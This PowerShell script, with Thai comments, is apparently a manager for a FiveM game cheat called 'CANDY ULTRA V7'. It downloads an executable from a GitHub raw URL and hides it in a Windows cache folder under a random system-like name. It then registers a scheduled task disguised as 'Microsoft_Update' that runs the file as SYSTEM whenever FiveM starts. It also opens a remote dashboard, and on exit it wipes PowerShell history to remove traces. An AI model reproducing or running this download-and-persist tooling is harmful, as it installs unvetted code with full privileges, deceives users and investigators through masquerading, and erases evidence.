# สุ่มชื่อไฟล์และ Task
$p_rand = @("font","drv","host","win","svc") | Get-Random
$m_rand = @("vcp","mgr","svc","hosts","core") | Get-Random
$r_rand = -join ((97..122) | Get-Random -Count 2 | % {[char]$_})
$fileName = "$p_rand$m_rand`_$r_rand.exe"
$taskName = "Microsoft_Update_$r_rand"

# ที่อยู่ไฟล์ (ซ่อนใน AppData เนียนกว่า)
$destFolder = "$env:LOCALAPPDATA\Microsoft\Windows\Caches"
if (!(Test-Path $destFolder)) { New-Item -Path $destFolder -ItemType Directory -Force }
$destPath = "$destFolder\$fileName"

# ลิงก์ไฟล์ของคุณ
$exeUrl = "https://raw.githubusercontent.com/backmrpun-hash/PS/refs/heads/main/hack1.exe"
# ลิงก์หน้า Dashboard ของคุณ
$dashboardUrl = "https://creative-bombolone-1e0912.netlify.app/"

while ($true) {
    Clear-Host
    Write-Host "--- CANDY ULTRA V7 MANAGER ---" -ForegroundColor Magenta
    Write-Host "1. Install & Persistence (Auto-run + Open Web)"
    Write-Host "2. Check Status"
    Write-Host "3. Self-Destruct (Uninstall)"
    Write-Host "0. Exit"
    Write-Host "------------------------------"
    
    $choice = Read-Host "Select Option"

    if ($choice -eq "1") {
        Clear-Host
        Write-Host "[*] Downloading Engine..." -ForegroundColor Cyan

        try {
            # 1. ดาวน์โหลดไฟล์ EXE
            $web = New-Object System.Net.WebClient
            $web.Headers.Add("User-Agent", "Mozilla/5.0")
            $web.DownloadFile($exeUrl, $destPath)
            Unblock-File -Path $destPath

            # 2. ตั้งค่าระบบรันอัตโนมัติ (Task Scheduler)
            auditpol /set /subcategory:"Process Creation" /success:enable | Out-Null
            $filter = "*[System[(EventID=4688)]] and *[EventData[Data[@Name='NewProcessName'] and (contains(.,'FiveM.exe') or contains(.,'FiveM_GTAProcess.exe'))]]"
            schtasks /create /tn "$taskName" /tr "'$destPath'" /sc ONEVENT /ec Security /mo "$filter" /ru SYSTEM /f | Out-Null

            Write-Host "[+] Installation Successful!" -ForegroundColor Green
            
            # --- ส่วนที่เพิ่ม: เปิดหน้าเว็บควบคุมทันที ---
            Write-Host "[*] Launching Dashboard..." -ForegroundColor Cyan
            Start-Process $dashboardUrl
            
            Write-Host "[!] System is now listening for FiveM launch." -ForegroundColor Yellow
        }
        catch {
            Write-Host "[X] Failure: $($_.Exception.Message)" -ForegroundColor Red
        }
        pause
    }
    elseif ($choice -eq "2") {
        Clear-Host
        Write-Host "--- SYSTEM STATUS ---" -ForegroundColor Cyan
        if (Test-Path $destPath) {
            Write-Host "Status: ACTIVE" -ForegroundColor Green
            Write-Host "File  : $fileName"
            # เปิดเว็บจากหน้านี้ได้ด้วย
            $webChoice = Read-Host "Open Dashboard now? (y/n)"
            if ($webChoice -eq "y") { Start-Process $dashboardUrl }
        } else {
            Write-Host "Status: NOT INSTALLED" -ForegroundColor Red
        }
        pause
    }
    elseif ($choice -eq "3") {
        schtasks /delete /tn "$taskName" /f 2>$null
        Remove-Item $destPath -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Cleaned all traces." -ForegroundColor Green
        pause
    }
    elseif ($choice -eq "0") {
        $historyPath = (Get-PSReadlineOption).HistorySavePath
        if (Test-Path $historyPath) { Clear-Content $historyPath -Force }
        Clear-History
        exit
    }
}
